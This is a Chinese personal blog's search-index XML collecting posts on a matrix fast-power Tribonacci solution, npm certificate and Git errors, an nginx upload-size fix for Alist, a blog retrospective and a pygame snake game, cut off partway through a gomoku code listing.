<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>矩阵快速幂</title>
      <link href="/2024/11/29/code/matrix/"/>
      <url>/2024/11/29/code/matrix/</url>
      
        <content type="html"><![CDATA[<h3 id="1137-第N个泰波那契数"><a href="#1137-第N个泰波那契数" class="headerlink" title="1137.第N个泰波那契数"></a>1137.第N个泰波那契数</h3><p>泰波那契序列 Tn 定义如下： T0 &#x3D; 0, T1 &#x3D; 1, T2 &#x3D; 1, 且在 n &gt;&#x3D; 0 的条件下 T(n+3) &#x3D; T(n) + T(n+1) + T(n+2) 给你整数 n，请返回第 n 个泰波那契数 Tn 的值。<br>动态规划时间复杂度是 O(n)，空间复杂度也是 O(n)。但使用矩阵快速幂就快很多了，计算斐波那契数列的时间复杂度是 O(logn)，空间复杂度是 O(1)。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>矩阵A<br>$$<br> \left[<br> \begin{matrix}<br>   1 &amp; 1 &amp; 1 \<br>   1 &amp; 0 &amp; 0 \<br>   0 &amp; 1 &amp; 0<br>  \end{matrix}<br>  \right] \tag{3}<br>$$</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">multiply</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; a, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; b) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">c</span>(<span class="number">3</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">3</span>; k++) &#123;</span><br><span class="line">                    c[i][j] = (c[i][j] + (<span class="type">long</span> <span class="type">long</span>)a[i][k] * b[k][j]) % <span class="number">1000000007</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">pow</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; a, <span class="type">int</span> n) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ret</span>(<span class="number">3</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        ret[<span class="number">0</span>][<span class="number">0</span>] = ret[<span class="number">1</span>][<span class="number">1</span>] = ret[<span class="number">2</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">multiply</span>(ret, a);</span><br><span class="line">            &#125;</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            a = <span class="built_in">multiply</span>(a, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">tribonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">a</span>(<span class="number">3</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        a = &#123;&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res = <span class="built_in">pow</span>(a, n);</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm install 安装失败</title>
      <link href="/2024/07/02/error/error/"/>
      <url>/2024/07/02/error/error/</url>
      
        <content type="html"><![CDATA[<h4 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h4><p>在学习Vue时，使用npm install 安装命令出错，卡住了，最后报错信息如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ npm install json-server --registry=https://registry.npm.taobao.org</span><br><span class="line">npm ERR! code CERT_HAS_EXPIRED</span><br><span class="line">npm ERR! errno CERT_HAS_EXPIRED</span><br><span class="line">npm ERR! request to https://registry.npm.taobao.org/json-server failed, reason: certificate has expired</span><br></pre></td></tr></table></figure><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>后来发现自己笔记本上的时间不正确，校准北京时间后正确安装。<br>当你的计算机时间不正确时，可能会导致证书验证出现问题。这是因为许多证书都包含了有效期限，计算机上的时间与证书中的有效期不匹配时，会导致证书被视为过期或无效。+</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>本次安装为局部安装，需要使用npx命令。<br>npx json-server –watch data&#x2F;db.json</p>]]></content>
      
      
      <categories>
          
          <category> Error </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名访问Alist上传失败</title>
      <link href="/2024/03/18/nginx/"/>
      <url>/2024/03/18/nginx/</url>
      
        <content type="html"><![CDATA[<h3 id="域名上传失败"><a href="#域名上传失败" class="headerlink" title="域名上传失败"></a>域名上传失败</h3><p>闲来无事给alist加了个域名，在使用过程中发现通过ip+端口号可以正常上传，通过域名访问却不行。<br>修改一下alist的nginx的配置文件就可以了。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>nginx配置文件默认在这个位置&#x2F;etc&#x2F;nginx&#x2F;sites-available<br>在nginx关于alist的配置文件添加上传文件大小和下载限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 设置最大长传大小为10000MB</span><br><span class="line">client_max_body_size 10000M;</span><br><span class="line"># 设置下载速率为1MB/s</span><br><span class="line">limit_rate 1M;</span><br></pre></td></tr></table></figure><p>如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@Abc:/etc/nginx/sites-available# vi a.000487.xyz</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name a.000487.xyz;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://23.95.209.236:5244;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;    </span><br><span class="line">        # 添加如下</span><br><span class="line">        client_max_body_size 100M;    </span><br><span class="line">        limit_rate 10M;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器部署 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> alist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git之旅</title>
      <link href="/2023/12/04/git/"/>
      <url>/2023/12/04/git/</url>
      
        <content type="html"><![CDATA[<p>自己写了一个网页，想部署到github上，然后使用vercel托管，以便外界访问。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1 在项目文件夹中打开Git Bash。<br>2 初始化Git仓库：git init<br>3 添加文件到Git：git add .<br>4（可选）更改分支名称：git branch -m &lt;新分支名&gt;<br>5 配置Git用户信息：<br>git config –global user.name “你的用户名”<br>git config –global user.email “你的邮箱”<br>6 关联远程仓库：git remote add origin &lt;仓库URL&gt;<br>7 提交更改：git commit -m “提交信息”<br>8 推送到远程仓库：git push -u origin main<br>9 从远程仓库拉取更新：git pull origin main<br>这是一个典型的Git工作流程，适用于大多数基本的版本控制需求。</p><h3 id="出现的错误"><a href="#出现的错误" class="headerlink" title="出现的错误"></a>出现的错误</h3><h4 id="refusing-to-merge-unrelated-histories"><a href="#refusing-to-merge-unrelated-histories" class="headerlink" title="refusing to merge unrelated histories"></a>refusing to merge unrelated histories</h4><p>这个错误 表明Git拒绝合并两个没有共同历史的仓库。这通常发生在当你的本地仓库和远程仓库是独立创建的，没有共享任何提交记录时。<br>为了解决这个问题，你可以在拉取命令中使用选项来强制合并两个不相关的历史。运行以下命令：pull–allow-unrelated-histories</p><p>git pull origin main –allow-unrelated-histories</p><p>完成后，如果出现任何合并冲突，请解决这些冲突。然后，你可以继续提交任何必要的更改，并再次尝试推送到远程仓库：</p><p>git push -u origin main</p><h4 id="文件的重命名"><a href="#文件的重命名" class="headerlink" title="文件的重命名"></a>文件的重命名</h4><p>我在本地重命名一个文件，提交后发现远程仓库里文件并没有变化。<br>我在github仓库中手动更改了该文件的名称，这就引发了第二个错误。</p><h4 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h4><p>在第一个错误的基础上，我进行了推送，然后引发了第二个错误</p><p>git push -u origin main</p><p>To <a href="https://github.com/A/B">https://github.com/A/B</a><br> ! [rejected]        main -&gt; main (fetch first)<br>error: failed to push some refs to ‘<a href="https://github.com/WaterMonn/artweb">https://github.com/WaterMonn/artweb</a>‘<br>hint: Updates were rejected because the remote contains work that you do<br>hint: not have locally. This is usually caused by another repository pushing<br>hint: to the same ref. You may want to first integrate the remote changes<br>hint: (e.g., ‘git pull …’) before pushing again.<br>hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details.</p><p>这个错误信息表明你尝试将本地的更改推送到GitHub仓库时遇到了问题，原因是远程仓库包含了一些你本地仓库中没有的提交。这通常发生在远程仓库被其他提交更新（比如你可能在GitHub上直接编辑了文件）而本地仓库还没有这些更新时。</p><p>此时，我应该先拉取远程仓库，然后进行更改提交。<br>这就引发了第三个错误</p><h4 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h4><p>hint: Updates were rejected because the tip of your current branch is behind<br>错误信息表明在尝试合并远程变更时，你的本地工作目录中存在未跟踪的文件，这些文件会被远程仓库中的文件覆盖。在合并之前，你需要处理这些文件。<br>远程仓库想要替换本地的，但该文件在本地是未跟踪的，因此Git无法决定应该覆盖文件还是保留文件。<br>当提示你的本地分支落后于远程分支时，意味着自从你上次从远程仓库拉取或克隆以来，远程仓库中已经有了新的提交。这通常是因为：</p><p>1 其他人向该仓库提交了新的更改。<br>2 或者你自己在GitHub网页上直接对文件进行了修改和提交。</p><p>放弃本地更改：<br>git reset –hard<br>git pull origin main<br>合并本地更改:<br>git add .<br>git commit -m “Resolve untracked files issue”<br>git pull origin main</p><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>GitHub仓库的主页面通常会展示仓库的创建时间，而最近一次提交的时间则可以在“Commits”部分找到。</p>]]></content>
      
      
      <categories>
          
          <category> Github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恭喜Faker</title>
      <link href="/2023/11/19/faker/"/>
      <url>/2023/11/19/faker/</url>
      
        <content type="html"><![CDATA[<h3 id="恭喜Faker-四冠王！"><a href="#恭喜Faker-四冠王！" class="headerlink" title="恭喜Faker,四冠王！"></a>恭喜Faker,四冠王！</h3><p><img src="https://z1.ax1x.com/2023/11/19/piUkpZt.png" alt="champion"></p>]]></content>
      
      
      
        <tags>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三次</title>
      <link href="/2023/11/19/thinker/"/>
      <url>/2023/11/19/thinker/</url>
      
        <content type="html"><![CDATA[<h3 id="话"><a href="#话" class="headerlink" title="话"></a>话</h3><p>这是本博客的第三次部署，之前因为未知的原因导致我无法更新博客，在多次查找错误和返回历史版本失败后，只得又一次重新部署博客。</p><h3 id="我"><a href="#我" class="headerlink" title="我"></a>我</h3><p>该博客搭建于2022年11月21日，马上一周年了，回想这一年多的经历，自己成长了不少。<br>第一次搭建博客的兴奋，被环境变量弄得苦恼，第一次发表博文的满足，想要完善博客的心有余而力不足，第一次搞崩博客的崩溃，重新部署博客的勇气，第二次搞崩博客的无奈，第三次部署博客的平静。<br>在这个过程中我收获颇丰，我十分感谢当初自己都勇气，哪怕我之后并没有太大作为。<br>我会在2023年11月21日为它上传一个纪念页面，庆祝它的一岁。</p>]]></content>
      
      
      <categories>
          
          <category> 反思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现五子棋贪吃蛇</title>
      <link href="/2023/11/19/python/game/"/>
      <url>/2023/11/19/python/game/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用python实现了贪吃蛇和五子棋，之后我会给它们加上ai.</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>贪吃蛇不能碰到墙壁和自己的身体，这是游戏规则。<br>ai方面我仅仅了解哈密顿回路和贪心算法。<br>五子棋要注意五子连成一线游戏结束。<br>ai方面是极大极小值算法和减枝算法。</p><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><h4 id="贪吃蛇"><a href="#贪吃蛇" class="headerlink" title="贪吃蛇"></a>贪吃蛇</h4><p>写的很烂,功能也不齐全，但这是我写的第一个python游戏。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line">BLACK = pygame.Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WHITE = pygame.Color(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">RED = pygame.Color(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">GREEN = pygame.Color(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">BLUE = pygame.Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">FRAME_SIZE_X = <span class="number">640</span></span><br><span class="line">FRAME_SIZE_Y = <span class="number">480</span></span><br><span class="line"></span><br><span class="line">pygame.display.set_caption(<span class="string">&#x27;贪吃蛇&#x27;</span>)</span><br><span class="line">game_window = pygame.display.set_mode((FRAME_SIZE_X, FRAME_SIZE_Y))</span><br><span class="line"></span><br><span class="line">fps_controller = pygame.time.Clock()</span><br><span class="line"></span><br><span class="line">snake_pos = [<span class="number">100</span>, <span class="number">50</span>]</span><br><span class="line">snake_body = [[<span class="number">100</span>, <span class="number">50</span>], [<span class="number">90</span>, <span class="number">50</span>], [<span class="number">80</span>, <span class="number">50</span>]]</span><br><span class="line"></span><br><span class="line">food_pos = [random.randrange(<span class="number">1</span>, (FRAME_SIZE_X // <span class="number">10</span>)) * <span class="number">10</span>, random.randrange(<span class="number">1</span>, (FRAME_SIZE_Y // <span class="number">10</span>)) * <span class="number">10</span>]</span><br><span class="line">food_spawn = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">change_to = direction</span><br><span class="line"></span><br><span class="line">score = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game_over</span>():</span><br><span class="line">    my_font = pygame.font.SysFont(<span class="string">&#x27;times new roman&#x27;</span>, <span class="number">90</span>)</span><br><span class="line">    game_over_surface = my_font.render(<span class="string">&#x27;false&#x27;</span>, <span class="literal">True</span>, RED)</span><br><span class="line">    game_over_rect = game_over_surface.get_rect()</span><br><span class="line">    game_over_rect.midtop = (FRAME_SIZE_X / <span class="number">2</span>, FRAME_SIZE_Y / <span class="number">4</span>)</span><br><span class="line">    game_window.fill(BLACK)</span><br><span class="line">    game_window.blit(game_over_surface, game_over_rect)</span><br><span class="line">    show_score(<span class="number">0</span>)</span><br><span class="line">    pygame.display.flip()</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    pygame.quit()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_score</span>(<span class="params">choice</span>):</span><br><span class="line">    score_font = pygame.font.SysFont(<span class="string">&#x27;consolas&#x27;</span>, <span class="number">35</span>)</span><br><span class="line">    score_surface = score_font.render(<span class="string">&#x27;SCORE:&#x27;</span> + <span class="built_in">str</span>(score), <span class="literal">True</span>, WHITE)</span><br><span class="line">    score_rect = score_surface.get_rect()</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        score_rect.midtop = (FRAME_SIZE_X / <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        score_rect.midtop = (FRAME_SIZE_X / <span class="number">2</span>, FRAME_SIZE_Y / <span class="number">1.25</span>)</span><br><span class="line">    game_window.blit(score_surface, score_rect)</span><br><span class="line">    pygame.display.flip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.KEYDOWN:</span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_UP <span class="keyword">or</span> event.key == <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">                change_to = <span class="string">&#x27;UP&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_DOWN <span class="keyword">or</span> event.key == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">                change_to = <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_LEFT <span class="keyword">or</span> event.key == <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">                change_to = <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_RIGHT <span class="keyword">or</span> event.key == <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>):</span><br><span class="line">                change_to = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">                <span class="comment"># 按ESC退出游戏</span></span><br><span class="line">            <span class="keyword">if</span> event.key == pygame.K_ESCAPE:</span><br><span class="line">                pygame.quit()</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> change_to == <span class="string">&#x27;UP&#x27;</span> <span class="keyword">and</span> direction != <span class="string">&#x27;DOWN&#x27;</span>:</span><br><span class="line">        direction = <span class="string">&#x27;UP&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> change_to == <span class="string">&#x27;DOWN&#x27;</span> <span class="keyword">and</span> direction != <span class="string">&#x27;UP&#x27;</span>:</span><br><span class="line">        direction = <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> change_to == <span class="string">&#x27;LEFT&#x27;</span> <span class="keyword">and</span> direction != <span class="string">&#x27;RIGHT&#x27;</span>:</span><br><span class="line">        direction = <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> change_to == <span class="string">&#x27;RIGHT&#x27;</span> <span class="keyword">and</span> direction != <span class="string">&#x27;LEFT&#x27;</span>:</span><br><span class="line">        direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;UP&#x27;</span>:</span><br><span class="line">        snake_pos[<span class="number">1</span>] -= <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;DOWN&#x27;</span>:</span><br><span class="line">        snake_pos[<span class="number">1</span>] += <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;LEFT&#x27;</span>:</span><br><span class="line">        snake_pos[<span class="number">0</span>] -= <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;RIGHT&#x27;</span>:</span><br><span class="line">        snake_pos[<span class="number">0</span>] += <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    snake_body.insert(<span class="number">0</span>, <span class="built_in">list</span>(snake_pos))</span><br><span class="line">    <span class="keyword">if</span> snake_pos[<span class="number">0</span>] == food_pos[<span class="number">0</span>] <span class="keyword">and</span> snake_pos[<span class="number">1</span>] == food_pos[<span class="number">1</span>]:</span><br><span class="line">        score += <span class="number">1</span></span><br><span class="line">        food_spawn = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        snake_body.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> food_spawn:</span><br><span class="line">        food_pos = [random.randrange(<span class="number">1</span>, (FRAME_SIZE_X // <span class="number">10</span>)) * <span class="number">10</span>, random.randrange(<span class="number">1</span>, (FRAME_SIZE_Y // <span class="number">10</span>)) * <span class="number">10</span>]</span><br><span class="line">    food_spawn = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># BlACK  BLACK</span></span><br><span class="line">    game_window.fill(BLACK)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> snake_body:</span><br><span class="line">        pygame.draw.rect(game_window,GREEN,pygame.Rect(pos[<span class="number">0</span>],pos[<span class="number">1</span>],<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    pygame.draw.rect(game_window,WHITE,pygame.Rect(food_pos[<span class="number">0</span>],food_pos[<span class="number">1</span>],<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> snake_pos[<span class="number">0</span>] &lt;<span class="number">0</span> <span class="keyword">or</span> snake_pos[<span class="number">0</span>] &gt; FRAME_SIZE_X-<span class="number">10</span>:</span><br><span class="line">        game_over()</span><br><span class="line">    <span class="keyword">if</span> snake_pos[<span class="number">1</span>] &lt; <span class="number">0</span> <span class="keyword">or</span> snake_pos[<span class="number">1</span>] &gt; FRAME_SIZE_Y - <span class="number">10</span>:</span><br><span class="line">        game_over()</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> snake_body[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> snake_pos[<span class="number">0</span>] == block[<span class="number">0</span>] <span class="keyword">and</span> snake_pos[<span class="number">1</span>] == block[<span class="number">1</span>]:</span><br><span class="line">            game_over()</span><br><span class="line"></span><br><span class="line">    show_score(<span class="number">1</span>)</span><br><span class="line">    pygame.display.update()</span><br><span class="line">    fps_controller.tick(<span class="number">25</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h4><p>这个更烂。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 